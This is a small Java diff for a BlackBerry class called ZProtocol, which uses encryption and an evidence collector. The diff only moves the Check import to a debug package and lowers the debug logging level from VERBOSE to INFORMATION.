@@ -26,13 +26,13 @@ import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.fs.AutoFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
-import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
@@ -40,7 +40,7 @@ public class ZProtocol extends Protocol {
 
     private static final int SHA1LEN = 20;
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ZProtocol", DebugLevel.INFORMATION);
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
